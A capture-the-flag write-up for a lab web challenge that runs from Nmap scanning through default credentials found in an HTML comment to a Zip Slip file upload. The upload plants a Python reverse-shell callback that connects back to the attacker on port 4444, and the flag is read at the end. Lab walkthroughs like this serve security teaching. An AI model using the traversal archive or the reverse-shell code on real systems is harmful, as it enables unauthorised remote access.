**Tags:** Web.

**Difficulty:** Medium.

# Room 10 — The Hollow Shell

## 1. Reconnaissance

Target:

```text
10.112.128.138
```

Initially, it seemed that there was no web page, so we start with Nmap:

```bash
sudo nmap -sS -sV 10.112.128.138
```

We get:

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-06 06:54 EDT
Nmap scan report for 10.112.128.138
Host is up (0.087s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Gunicorn
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two ports are open:

```text
22/tcp   SSH
5000/tcp HTTP — Gunicorn
```

---

## 2. Web Application Analysis

We check port `5000`:

```bash
curl -l http://10.112.128.138:5000
```

The server responds with a redirect:

```text
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login">/login</a>. If not, click the link.
```

The redirect leads to:

```text
/login
```

---

## 3. Finding Credentials

We retrieve the page contents:

```bash
curl -l http://10.112.128.138:5000/login
```

An HTML comment is found in the page:

```html
<!--
───────────────────────────────────────────────────────────────
 Byte Lotus // internal display-manager portal
 New on the floor team? IT seeds every property with the same
 starter login until you set your own:
     user: concierge
     pass: StayNoticed2024!
 (rotate it from Settings on first sign-in — most people forget)
───────────────────────────────────────────────────────────────
-->
```

Thus, the initial credentials are present in the page source:

```text
Username: concierge
Password: StayNoticed2024!
```

---

## 4. Authentication

We use the discovered credentials:

```bash
curl -i -c cookies.txt \
-X POST http://10.112.128.138:5000/login \
-d "username=concierge&password=StayNoticed2024!"
```

We get:

```text
HTTP/1.1 302 FOUND
Server: gunicorn
Location: /dashboard
Vary: Cookie
Set-Cookie: session=eyJzdGFmZiI6ImNvbmNpZXJnZSJ9.anRo0g.ipte9p59bnuT3EN0irV4rn40oEw; HttpOnly; Path=/
```

The server successfully authenticates the user and redirects them to:

```text
/dashboard
```

We access the dashboard:

```bash
curl -b cookies.txt -L http://10.112.128.138:5000/dashboard
```

---

# 5. Analyzing the Upload Functionality

On the dashboard, we discover a `.zip` upload function:

```html
<h2>Bring a shell ashore</h2>
<p class="lede">
  Found something on the beach? Upload it as a <b>shell</b>
  (a <code style="font-family:var(--mono)">.zip</code> souvenir pack) to set the ambiance on the
  in-room tablets. Each shell must contain a <b>shell.json</b> manifest
  listing its assets (images, stylesheets).
</p>
```

The form:

```html
<form method="post" action="/upload" enctype="multipart/form-data">
```

The upload is handled through:

```text
/upload
```

The page also mentions that the archive may contain **automation hooks**:

```text
A shell may include optional automation hooks — the theme worker
applies these for you shortly after the shell comes ashore
```

Allowed asset types:

```text
png jpg gif svg css json
```

---

# 6. Testing a Normal ZIP

We create a simple archive containing `shell.json`.

```bash
mkdir shell
cd shell/
cat > shell.json <<'EOF'
{
  "name": "test",
  "assets": []
}
EOF
```

Create the archive:

```bash
zip -r test.zip shell.json
```

We get:

```text
adding: shell.json (deflated 5%)
```

Upload it:

```bash
curl -b ../cookies.txt \
-F "shell=@test.zip" \
http://10.112.128.138:5000/upload
```

The server redirects back to the dashboard:

```text
HTTP/1.1 Redirecting...
Location: /dashboard
```

After viewing the dashboard again, we see the uploaded shell:

```text
test
shells/21203082b0f1/
```

After another upload, a second one appears:

```text
test
shells/ff7c47a4ee84/
```

This confirms that the server accepts ZIP files and extracts their contents.

---

# 7. Testing Automation Hooks

Next, we check whether we can control automation hooks through `shell.json`.

We create:

```bash
mkdir pwn
cd pwn/
cat > shell.json <<'EOF'
{
  "name": "pwn",
  "assets": [],
  "hooks": {
    "post_install": "id"
  },
  "automation": {
    "command": "id"
  },
  "hook": "id",
  "command": "id"
}
EOF
```

Create the archive:

```bash
zip -r pwn.zip shell.json
```

We get:

```text
adding: shell.json (deflated 39%)
```

Upload it:

```bash
curl -b ~/Desktop/cookies.txt \
-F "shell=@pwn.zip" \
http://10.112.128.138:5000/upload
```

After this, the dashboard shows:

```text
pwn
shells/6a1aa1d8dc31/
```

However, the expected execution of `id` through these fields does not occur.

---

# 8. Directory Enumeration

We also run Gobuster:

```bash
gobuster dir -u http://10.112.128.138:5000 -w ~/HH101/seclists/Discovery/Web-Content/common.txt -x txt,php,py
```

Result:

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.112.128.138:5000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/deb88/HH101/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              py,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/dashboard            (Status: 302) [Size: 199] [--> /login]
/login                (Status: 200) [Size: 1832]
/logout               (Status: 302) [Size: 199] [--> /login]
/upload               (Status: 405) [Size: 153]
Progress: 19008 / 19008 (100.00%)
===============================================================
Finished
```

Thus, Gobuster does not discover any additional interesting endpoints.

---

# 9. Discovering Zip Slip

At this point, it becomes clear that the most interesting part of the application is the processing of uploaded ZIP archives.

We create a ZIP manually using Python. The archive contains a normal `shell.json` and, as a second object, a file with a traversal path:

```text
../../hooks/callback.py
```

This allows us to escape the directory where the application extracts the uploaded archive.

We create a Python script:

```python
import zipfile, json

manifest = {"name": "reverse", "assets": []}

callback = '''
import socket, os, pty
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.154.82ATTACKER_IP", 4444))
for fd in (0, 1, 2):
    os.dup2(sock.fileno(), fd)
pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("reverse-shell.zip", "w") as z:
    z.writestr("shell.json", json.dumps(manifest))
    z.writestr("../../hooks/callback.py", callback)
```

The key point here is:

```python
z.writestr("../../hooks/callback.py", callback)
```

The `../` allows us to write the file outside the expected extraction directory.

This is a classic **Zip Slip / Path Traversal during archive extraction** vulnerability.

---

# 10. Obtaining a Reverse Shell

After running the Python script, we get:

```text
reverse-shell.zip
```

Start a Netcat listener:

```bash
nc -lvnp 4444
```

We get:

```text
listening on [any] 4444 ...
connect to [192.168.154.82] from (UNKNOWN) [10.112.128.138] 45448
```

The reverse shell successfully connects.

We check the current directory:

```bash
ls
```

We get:

```text
__pycache__  hooks  shells  templates  tmp
app.py  requirements.txt  static  theme_worker.py  venv
```

Current directory:

```text
/var/www/conch
```

User:

```text
roomservice
```

---

# 11. Obtaining the Flag

After getting the shell, we inspect the home directory:

```text
/home/ubuntu
```

There we find:

```text
flag.txt
```

Contents:

```text
THM{z1p_sl1pp3d_1nt0_a_sh3ll}
```

---

# Final Chain

```text
Nmap
  │
  ▼
5000/tcp — Gunicorn
  │
  ▼
/login
  │
  ▼
Credentials in HTML comment
concierge : StayNoticed2024!
  │
  ▼
/dashboard
  │
  ▼
ZIP upload
  │
  ▼
shell.json
  │
  ▼
ZIP extraction analysis
  │
  ▼
Zip Slip
../../hooks/callback.py
  │
  ▼
write Python callback
  │
  ▼
reverse shell
  │
  ▼
roomservice@tryhackme-2404
  │
  ▼
/home/ubuntu/flag.txt
  │
  ▼
THM{z1p_sl1pp3d_1nt0_a_sh3ll}
```

## Flag

```text
THM{z1p_sl1pp3d_1nt0_a_sh3ll}
```

### Main Vulnerability

**Zip Slip** — the application handles file paths inside uploaded ZIP archives insecurely. Using:

```text
../../hooks/callback.py
```

allows us to write a file outside the intended directory. In this case, it is used to place a Python callback, which is then executed by the theme worker and establishes a reverse shell.
